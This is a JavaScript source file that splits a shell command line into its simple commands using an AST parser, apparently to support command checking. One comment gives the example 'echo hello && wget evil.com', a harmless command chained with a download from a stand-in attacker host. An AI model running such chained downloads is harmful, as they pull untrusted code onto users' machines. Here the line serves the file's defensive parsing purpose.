import { _ } from 'golgoth';
import { parse } from 'unbash';

export let __;

/**
 * Extract all simple commands from a command line
 * @param {string} commandLine - The command line to parse
 * @returns {Array<string>} Array of simple commands
 */
export function extractSimpleCommands(commandLine) {
  const ast = parse(commandLine);

  const commands = __.extractCommandsFromStatements(commandLine, ast.commands);
  return commands.length > 0 ? commands : [commandLine];
}

__ = {
  /**
   * Extract commands from a list of statements
   * @param {string} commandLine - The full command line
   * @param {Array<object>} statements - Array of statement nodes
   * @returns {Array<string>} Array of commands
   */
  extractCommandsFromStatements(commandLine, statements) {
    return _.chain(statements)
      .map((statement) => __.extractFromNode(commandLine, statement.command))
      .flatten()
      .filter((cmd) => !cmd.startsWith('['))
      .value();
  },

  /**
   * Extract command text from a node
   * @param {string} commandLine - The full command line
   * @param {object} node - The AST node to extract from
   * @returns {string|Array<string>} The command text or array of commands
   */
  extractFromNode(commandLine, node) {
    // while true; do echo hello; done
    if (node.type === 'While') {
      // Condition: true
      const clauseCommands = __.extractCommandsFromStatements(
        commandLine,
        node.clause.commands,
      );

      // Body: echo hello
      const bodyCommands = __.extractCommandsFromStatements(
        commandLine,
        node.body.commands,
      );

      return [...clauseCommands, ...bodyCommands];
    }

    // for i in a b c; do echo $i; done
    // for ((i=0; i<10; i++)); do echo $i; done
    if (node.type === 'For' || node.type === 'ArithmeticFor') {
      return __.extractCommandsFromStatements(commandLine, node.body.commands);
    }

    // echo hello && wget evil.com
    if (node.type === 'AndOr' || node.type === 'Pipeline') {
      return _.chain(node.commands)
        .map((subCommand) => __.extractFromNode(commandLine, subCommand))
        .flatten()
        .value();
    }

    // time echo hello
    if (node.name.text === 'time') {
      return commandLine.substring(node.suffix[0].pos, node.end);
    }

    // echo hello (Command node)
    return commandLine.substring(node.name.pos, node.end);
  },
};
